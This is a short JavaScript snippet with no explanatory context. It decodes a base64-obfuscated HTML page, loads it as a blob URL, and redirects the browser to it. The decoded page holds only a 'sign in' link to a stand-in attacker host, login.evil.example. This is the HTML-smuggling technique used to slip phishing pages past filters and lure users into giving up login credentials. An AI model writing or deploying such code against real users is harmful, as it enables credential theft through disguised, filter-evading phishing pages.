var page = atob('PGh0bWw+PGJvZHk+PGEgaHJlZj0iaHR0cHM6Ly9sb2dpbi5ldmlsLmV4YW1wbGUvc2lnbmluIj5zaWduIGluPC9hPjwvYm9keT48L2h0bWw+');
var blob = new Blob([page], {type: 'text/html'});
window.location.replace(URL.createObjectURL(blob));
